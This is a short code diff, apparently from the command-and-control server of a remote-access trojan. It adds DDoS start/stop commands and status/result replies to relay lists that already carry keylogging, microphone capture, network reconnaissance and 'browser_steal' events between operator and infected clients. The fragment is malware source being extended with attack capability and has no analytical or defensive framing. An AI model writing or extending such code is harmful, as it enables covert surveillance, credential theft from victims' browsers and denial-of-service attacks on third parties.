@@ -290,6 +290,8 @@ RELAY_TO_CLIENT = [
     "mic_start", "mic_stop",
     "keylog_start", "keylog_stop",
     "network_info", "browser_steal",
+    # DDoS
+    "ddos_start", "ddos_stop",
 ]
 
 for event_name in RELAY_TO_CLIENT:
@@ -333,6 +335,8 @@ RELAY_TO_OPERATOR = [
     "mic_data", "mic_status",
     "keylog_data", "keylog_status",
     "network_info_result", "browser_steal_result",
+    # DDoS
+    "ddos_status", "ddos_result",
 ]
 
 for event_name in RELAY_TO_OPERATOR:
